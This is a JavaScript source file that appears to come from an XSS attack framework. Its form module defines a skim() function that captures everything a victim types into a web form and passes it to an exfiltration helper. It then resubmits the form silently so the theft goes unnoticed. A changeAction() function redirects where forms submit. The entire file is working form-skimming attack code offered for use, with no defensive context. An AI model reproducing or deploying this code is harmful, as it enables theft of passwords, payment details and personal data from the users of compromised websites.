xsstd.form = xsstd.std.extend({
   
   _formSelector:'',
   _bubble:true,
   _submitAfterSkim:true,
   
   constructor: function(){

	   	this._setParams(arguments[0]);
   },

   skim: function(opt){

	   	var _self = this;

	    this._setParams(opt);

	   	$frm = $(this._formSelector);

	   	if ($frm.length != 0){
	   		
	   		function skimForm(event){

	   			xsstd.exfil.send($frm.serialize());
	   			
	   			if (_self._bubble == false){
	   				event.preventDefault();				
	   			}

	   			if (_self._submitAfterSkim == true){
	   				event.preventDefault();		
					$frm.unbind('submit', skimForm);
					
					$frm[0].submit();

					$frm.bind('submit', skimForm);
	   			}
	   		};

	   		$frm.bind('submit', skimForm);

	   		xsstd.log('skimmer: now skimming: ' + _self._formSelector);
	   	} else {
	   		xsstd.log('skimmer: no form found.');
	   	}
   },

   changeAction: function(opt){

	   	this._setParams(opt);

	   	$frm = $(this._formSelector);

	   	if ($frm.length != 0){
	   		
	   		if (this._action != undefined){
		   		$frm.attr('action', this._action);
		   	}

	   		if (this._method != undefined){
		   		$frm.attr('method', this._method);
		   	}

	   		xsstd.log('changeAction: form action changed!: ' + this._formSelector);
	   	} else {
	   		xsstd.log('changeAction: no form found.');
	   	}
   },

   _setParams: function(args){

	   	if (typeof args!='undefined'){
		   	if(typeof args.selector=='string'){
		   		this._formSelector = args.selector;
		   	}
		   	if(typeof args.bubble=='boolean'){
		   		this._bubble = args.bubble;
		   	}
		   	if(typeof args.submitAfterSkim=='boolean'){
		   		this._submitAfterSkim = args.submitAfterSkim;
		   	}
		   	if(typeof args.action=='string'){
		   		this._action = args.action;
		   	}
		   	if(typeof args.method=='string'){
		   		this._method = args.method;
		   	}
		}
   }

});
